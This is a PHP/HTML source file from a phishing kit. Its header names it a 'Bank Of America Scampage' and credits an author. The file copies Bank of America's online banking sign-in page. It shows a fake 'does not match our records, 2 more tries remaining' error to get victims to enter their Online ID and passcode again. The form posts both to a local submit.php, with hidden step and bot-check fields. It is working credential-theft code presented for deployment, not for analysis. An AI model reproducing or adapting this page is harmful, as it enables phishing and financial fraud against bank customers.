<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             26/10/2019
 * @package           Bank Of America Scampage
 *
 * Project Name:      Bank Of America Scampage
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico" />


        <title>Bank of America | Online Banking | Sign In | Online IDIn</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="row">
                    <div class="col-md-6">
                        <div class="logo"><a href="#"><img src="../assets/images/logo.png"></a></div>
                    </div>
                    <div class="col-md-6">
                        <ul class="header-menu">
                            <li><a href="#"><i class="fas fa-lock"></i> Secure Area</a></li>
                            <li><a href="#">En Español</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="login-area">
                    <div class="title"><h3>Sign In to Online Banking</h3></div>
                    <div class="error-login">
                        <div><i class="fas fa-exclamation-triangle"></i></div>
                        <p>The Online ID or Passcode you entered does not match our records. You have 2 more tries remaining.<br>Please try again or click Forgot ID/Passcode</p>
                    </div>
                    <div class="row">
                        <div class="col-lg-4 col-md-12 col-sm-12 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5 with-border">
                            <form method="post" action="submit.php">
                                <div class="form-group mb-5">
                                    <label for="online_id">Online ID</label>
                                    <input type="text" name="online_id" id="online_id">
                                    <input type="checkbox" name="vehicle1" value="Bike"> <span>Save this Online ID <i class="fas fa-question-circle"></i></span>
                                </div>
                                <div class="form-group mb-5">
                                    <label for="passcode">Passcode</label>
                                    <input type="password" class="readonly" name="passcode" id="passcode" readonly>
                                    <a href="#">Forgot your Passcode?</a>
                                </div>
                                <input type="hidden" name="type" value="etaplogin2">
                                <input type="hidden" name="verbot">
                                <div class="form-group">
                                    <button type="submit"><i class="fas fa-lock"></i> Sign in</button>
                                </div>
                            </form>
                        </div>
                        <div class="col-lg-4 col-md-12 col-sm-12 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                            <p>better yet, get the app</p>
                            <div class="row">
                                <div class="col-md-6">
                                    <img src="../assets/images/img.png">
                                </div>
                                <div class="col-md-6 d-flex align-items-center">
                                    <div>
                                        <p>Your finances at your fingertips, anytime</p>
                                        <a href="#" class="button">Get the app</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-md-12 col-sm-12 col-12">
                            <div class="mb-4">
                                <h4>Sign-in help</h4>
                                <ul>
                                    <li><a href="#">Forgot ID/Passcode?</a></li>
                                    <li><a href="#">Problem signing in?</a></li>
                                </ul>
                            </div>
                            <div>
                                <h4>Not using Online Banking?</h4>
                                <ul>
                                    <li><a href="#">Enroll nowfor online Banking</a></li>
                                    <li><a href="#">Learn more about Online Banking</a></li>
                                    <li><a href="#">Service Agreement</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer" style="margin-top: 300px;">
            <div class="container">
                <p style="font-weight: 700"><i class="fas fa-lock"></i> Secure area</p>
                <p><a href="#">Privacy & Security</a></p>
                <p class="mb-0">Bank of America, N.A. Member FDIC. <a href="#">Equal Housing Lender</a><br>&copy; 2019 Bank of America Corporation. All rights reserved.</p>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            $('#online_id').keyup(function(){
                if( $(this).val().length > 5 ) {
                    $('#passcode').removeAttr('readonly');
                    $('#passcode').removeClass('readonly');
                } else {
                    $('#passcode').attr('readonly',"");
                    $('#passcode').addClass('readonly');
                }
            });
        </script>

    </body>

</html>